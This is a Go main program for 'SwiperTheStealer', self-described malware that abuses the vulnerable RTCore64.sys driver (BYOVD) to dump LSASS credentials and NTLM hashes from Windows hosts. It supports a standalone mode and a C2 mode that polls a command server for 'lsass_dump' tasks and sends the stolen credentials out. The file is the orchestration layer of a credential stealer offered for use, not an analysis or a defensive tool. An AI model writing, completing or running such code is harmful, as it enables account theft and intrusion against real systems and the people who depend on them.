// Package main is the entry point for the SwiperTheStealer application.
// It handles command-line arguments, configuration, initialization of components,
// and orchestrates the main operational logic for both standalone and C2 modes.
package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/internal/c2client"
	"swiper-the-stealer/internal/config"
	"swiper-the-stealer/internal/lsass"
	"swiper-the-stealer/pkg/logger"
)

const (
	DefaultConfigPath = "./config.json"
	AppVersion        = "1.0.0"
	AppName           = "SwiperTheStealer - Advanced Credential Extraction Engine"
)

var (
	configPath  = flag.String("config", DefaultConfigPath, "Path to configuration file")
	logLevel    = flag.String("log", "INFO", "Log level (DEBUG, INFO, WARN, ERROR)")
	testMode    = flag.Bool("test", false, "Run in test mode (RTCore64 exploit test only)")
	noC2        = flag.Bool("no-c2", false, "Run without C2 communication (standalone mode)")
	showVersion = flag.Bool("version", false, "Show version information")
)

func main() {
	// Create a debug log file for immediate startup diagnostics.
	debugFile, err := os.Create("debug.log")
	if err == nil {
		fmt.Fprintf(debugFile, "[DEBUG] SwiperTheStealer starting at %s\n", time.Now().Format("2006-01-02 15:04:05"))
		debugFile.Close()
	}

	flag.Parse()

	if *showVersion {
		printVersion()
		os.Exit(0)
	}

	fmt.Println("SwiperTheStealer v1.0.0 - Initialization started...")

	// Initialize the logger.
	log := logger.NewLogger(*logLevel)
	log.Infof("Starting %s v%s", AppName, AppVersion)

	// Load configuration from file or create a default one.
	cfg, err := config.LoadConfig(*configPath)
	if err != nil {
		log.Errorf("Failed to load configuration: %v", err)
		log.Info("Creating default configuration...")

		cfg = createDefaultConfig()
		if err := cfg.SaveConfig(*configPath); err != nil {
			log.Errorf("Failed to save default configuration: %v", err)
		} else {
			log.Infof("Default configuration saved to %s", *configPath)
		}
	}

	log.Infof("Configuration loaded successfully from %s", *configPath)

	// Initialize the RTCore BYOVD exploit handler.
	log.Info("Initializing RTCore BYOVD exploit...")
	exploit := byovd.NewRTCoreExploit(log)

	// Attempt to connect to the RTCore64.sys driver.
	log.Info("Attempting RTCore64.sys device connection...")
	if err := exploit.Initialize(); err != nil {
		log.Warnf("RTCore64.sys initialization failed: %v", err)
		log.Warn("This is expected if MSI Afterburner is not running. Continuing with limited functionality...")
	} else {
		log.Info("RTCore64.sys device connection established.")
		defer exploit.Close()
	}

	log.Info("RTCore BYOVD exploit initialized successfully.")

	// If in test mode, verify RTCore functionality and exit.
	if *testMode {
		runTestMode(exploit, log)
		return
	}

	// Initialize the core credential extraction engine.
	log.Info("Initializing SwiperTheStealer Extraction Engine...")
	swiperExtractor, err := lsass.NewSwiperTheStealer(exploit, log)
	if err != nil {
		log.Errorf("Failed to create SwiperTheStealer extractor: %v", err)
		log.Warn("SwiperTheStealer initialization failed.")
	} else {
		log.Info("SwiperTheStealer extraction engine initialized successfully.")
	}

	// If in standalone mode, perform extraction and exit.
	if *noC2 {
		runStandaloneMode(swiperExtractor, log)
		return
	}

	// --- C2 Communication Logic ---
	runC2Mode(cfg, swiperExtractor, log)

	// Wait for a shutdown signal to gracefully terminate.
	waitForShutdown(log)
}

// printVersion displays version information and exits.
func printVersion() {
	fmt.Printf("%s v%s\n", AppName, AppVersion)
	fmt.Println("Advanced Credential Extraction Engine with BYOVD RTCore64.sys")
	fmt.Println("Professional Go implementation - Configurable - Maximum stealth")
	fmt.Println("Integrates RTCore privilege escalation with advanced memory parsing")
	fmt.Println("Connects to C2 server for remote credential harvesting")
}

// runTestMode verifies RTCore functionality.
func runTestMode(exploit *byovd.RTCoreExploit, log *logger.Logger) {
	log.Info("Running in test mode - verifying RTCore functionality...")
	testAddr := uint64(0x1000)
	testData, err := exploit.ReadPhysicalMemory(testAddr, 0x100)
	if err != nil {
		log.Errorf("RTCore test failed: %v", err)
		os.Exit(1)
	}
	log.Infof("RTCore test successful - read %d bytes from 0x%x", len(testData), testAddr)
	log.Info("RTCore64.sys is operational and ready for credential extraction.")
}

// runStandaloneMode executes the credential extraction without C2 communication.
func runStandaloneMode(extractor *lsass.SwiperTheStealer, log *logger.Logger) {
	log.Info("Running in standalone mode - performing credential extraction...")
	if extractor == nil {
		log.Error("SwiperTheStealer extractor not available.")
		os.Exit(1)
	}

	credentials, err := extractor.Execute()
	if err != nil {
		log.Errorf("SwiperTheStealer credential extraction failed: %v", err)
		log.Error("Check RTCore driver access and LSASS process availability.")
		os.Exit(1)
	}

	log.Infof("Successfully extracted %d credential sets:", len(credentials))
	for i, cred := range credentials {
		log.Infof("Credential %d: %s\\%s", i+1, cred.Domain, cred.Username)
		if cred.NTLM != "" {
			log.Infof("   NTLM: %s", cred.NTLM)
		}
		log.Infof("   Type: %s", cred.Type)
	}
	log.Info("Standalone credential extraction completed successfully.")
}

// runC2Mode initializes and manages the C2 communication loop.
func runC2Mode(cfg *config.Config, extractor *lsass.SwiperTheStealer, log *logger.Logger) {
	log.Info("Initializing C2 client...")
	c2 := c2client.NewC2Client(&cfg.C2, log)

	log.Info("Registering with C2 server...")
	if err := c2.Register(); err != nil {
		log.Errorf("Failed to register with C2 server, will retry: %v", err)
	}

	// Main C2 loop for fetching tasks and handling commands.
	go func() {
		for {
			cmd, err := c2.CheckIn()
			if err != nil {
				log.Warnf("Failed to check for C2 tasks: %v", err)
				time.Sleep(time.Duration(cfg.C2.PollIntervalSec) * time.Second)
				continue
			}

			if cmd != nil && cmd.Command == "lsass_dump" {
				go handleCredentialExtraction(cmd.TaskID, extractor, c2, log)
			}
			time.Sleep(time.Duration(cfg.C2.PollIntervalSec) * time.Second)
		}
	}()

	log.Info("SwiperTheStealer is operational and awaiting C2 commands...")
}


// handleCredentialExtraction is executed as a goroutine to handle a C2 task.
func handleCredentialExtraction(taskID string, extractor *lsass.SwiperTheStealer, c2 *c2client.C2Client, log *logger.Logger) {
	log.Infof("Executing credential dump for task: %s", taskID)
	if extractor == nil {
		log.Errorf("SwiperTheStealer extractor not available for task %s", taskID)
		c2.SendError("lsass_dump", taskID, "SwiperTheStealer extractor not initialized")
		return
	}

	credentials, err := extractor.Execute()
	if err != nil {
		errMsg := fmt.Sprintf("Credential extraction failed: %v", err)
		log.Errorf("Credential extraction failed for task %s: %v", taskID, err)
		c2.SendError("lsass_dump", taskID, errMsg)
		return
	}

	log.Infof("Successfully extracted %d credentials for task %s", len(credentials), taskID)

	// Convert to C2 format and send.
	c2Creds := make([]lsass.LSASSCredentials, len(credentials))
	for i, cred := range credentials {
		c2Creds[i] = lsass.LSASSCredentials{
			Username: cred.Username,
			Domain:   cred.Domain,
			NTLM:     cred.NTLM,
		}
	}

	if err := c2.SendCredentials(c2Creds, taskID); err != nil {
		log.Errorf("Failed to send credentials to C2 for task %s: %v", taskID, err)
		return
	}

	log.Infof("Credentials successfully transmitted to C2 server for task %s", taskID)
}

// waitForShutdown blocks until a termination signal is received.
func waitForShutdown(log *logger.Logger) {
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
	log.Info("Shutdown signal received. Terminating SwiperTheStealer.")
}


// createDefaultConfig generates a default configuration if one is not found.
func createDefaultConfig() *config.Config {
	return &config.Config{
		C2: config.C2Config{
			ServerURL:         "http://127.0.0.1:8080",
			APIKey:            "your-secret-api-key",
			SkipTLSVerify:     true,
			TimeoutSeconds:    30,
			RequestTimeout:    30,
			HeartbeatInterval: 60,
			CheckinInterval:   10,
			RetryAttempts:     3,
			RetryDelayMs:      5000,
			PollIntervalSec:   5,
		},
		Logging: config.LoggingConfig{
			Level:      "INFO",
			OutputFile: "swiper.log",
		},
		BYOVD: config.BYOVDConfig{
			PreferredDriver: "RTCore64.sys",
			ScanDrivers:     []string{"RTCore64.sys", "DBUtilDrv2.sys", "gdrv.sys"},
			TestMode:        false,
			MemoryScanSize:  1048576,
		},
	}
}

// init customizes the default flag usage message.
func init() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  -config string\n    \tPath to configuration file (default \"./config.json\")\n")
		fmt.Fprintf(os.Stderr, "  -log string\n    \tLog level (DEBUG, INFO, WARN, ERROR) (default \"INFO\")\n")
		fmt.Fprintf(os.Stderr, "  -test\n    \tRun in test mode (RTCore64 exploit test only)\n")
		fmt.Fprintf(os.Stderr, "  -no-c2\n    \tRun without C2 communication (standalone mode)\n")
		fmt.Fprintf(os.Stderr, "  -version\n    \tShow version information\n")
	}
}
